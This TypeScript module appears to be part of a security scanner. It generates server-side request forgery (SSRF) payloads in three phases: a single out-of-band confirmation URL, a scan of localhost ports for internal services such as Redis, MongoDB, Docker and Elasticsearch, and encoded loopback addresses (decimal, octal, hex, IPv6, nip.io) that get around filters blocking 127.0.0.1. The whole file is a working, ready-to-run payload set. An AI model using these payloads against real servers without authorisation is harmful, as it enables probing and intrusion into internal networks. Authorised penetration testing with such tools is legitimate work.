export interface Payload {
  group: "oob_direct" | "port_scan" | "ip_bypass";
  type: string;
  value: string;
}

/**
 * Extracts only the hostname from an OOB URL.
 * Used for header injection values (headers take host, not full URL).
 * "https://abc.oast.site"     → "abc.oast.site"
 * "https://webhook.site/uuid" → "webhook.site"
 */
export function extractOobHost(oobUrl: string): string {
  return oobUrl.replace(/^https?:\/\//, "").replace(/[/?].*$/, "");
}

/**
 * Phase 1 — Single OOB confirmation probe.
 * Just one request with the full OOB URL to confirm SSRF exists.
 * Only the http:// variant is used — if it arrives, SSRF is confirmed.
 */
export function generatePhase1Payload(oobUrl: string): Payload {
  const full = oobUrl.replace(/^https?:\/\//, "http://");
  return { group: "oob_direct", type: "http_full", value: full };
}

/**
 * Phase 2 (hit path) — Port discovery on localhost.
 * Probes common internal ports to identify running services.
 * Response body may contain service banners (reported as SSRF impact).
 */
export function generatePortScanPayloads(): Payload[] {
  const PORTS: Array<{ port: number; svc: string }> = [
    { port: 80,    svc: "http" },
    { port: 443,   svc: "https" },
    { port: 8080,  svc: "http-alt" },
    { port: 8443,  svc: "https-alt" },
    { port: 8000,  svc: "dev" },
    { port: 8888,  svc: "jupyter" },
    { port: 3000,  svc: "nodejs" },
    { port: 5000,  svc: "flask" },
    { port: 9000,  svc: "dev-9000" },
    { port: 4848,  svc: "glassfish" },
    { port: 22,    svc: "ssh" },
    { port: 21,    svc: "ftp" },
    { port: 3306,  svc: "mysql" },
    { port: 5432,  svc: "postgres" },
    { port: 6379,  svc: "redis" },
    { port: 27017, svc: "mongodb" },
    { port: 9200,  svc: "elastic" },
    { port: 2181,  svc: "zookeeper" },
    { port: 11211, svc: "memcached" },
    { port: 5672,  svc: "rabbitmq" },
    { port: 9090,  svc: "prometheus" },
    { port: 2375,  svc: "docker" },
  ];

  return PORTS.map(({ port, svc }) => ({
    group: "port_scan" as const,
    type: `${svc}:${port}`,
    value: `http://127.0.0.1:${port}`,
  }));
}

/**
 * Phase 3 — IP bypass encodings.
 * For when 127.0.0.1 is blocked — tries decimal, octal, hex, IPv6, etc.
 * Targets ports 80 and 8080.
 */
export function generateIpBypassPayloads(): Payload[] {
  return [
    // Decimal encoding of 127.0.0.1
    { group: "ip_bypass", type: "decimal",         value: "http://2130706433" },
    { group: "ip_bypass", type: "decimal_8080",    value: "http://2130706433:8080" },
    // Octal encodings
    { group: "ip_bypass", type: "octal_dotted",    value: "http://0177.0.0.1" },
    { group: "ip_bypass", type: "octal_32bit",     value: "http://017700000001" },
    // Hex encodings
    { group: "ip_bypass", type: "hex",             value: "http://0x7f000001" },
    { group: "ip_bypass", type: "hex_dotted",      value: "http://0x7f.0x0.0x0.0x1" },
    // Short / alternative forms
    { group: "ip_bypass", type: "short_127_1",     value: "http://127.1" },
    { group: "ip_bypass", type: "zero",            value: "http://0" },
    { group: "ip_bypass", type: "all_ifaces",      value: "http://0.0.0.0" },
    // IPv6 loopback
    { group: "ip_bypass", type: "ipv6_loopback",   value: "http://[::1]" },
    { group: "ip_bypass", type: "ipv6_loopback_80",value: "http://[::1]:80" },
    { group: "ip_bypass", type: "ipv4_mapped_v6",  value: "http://[::ffff:127.0.0.1]" },
    { group: "ip_bypass", type: "ipv6_full",       value: "http://[0000::1]" },
    // Localhost hostname
    { group: "ip_bypass", type: "localhost",       value: "http://localhost" },
    { group: "ip_bypass", type: "localhost_8080",  value: "http://localhost:8080" },
    // DNS rebinding helpers
    { group: "ip_bypass", type: "nip_io",          value: "http://127.0.0.1.nip.io" },
    { group: "ip_bypass", type: "localtest_me",    value: "http://localtest.me" },
  ];
}
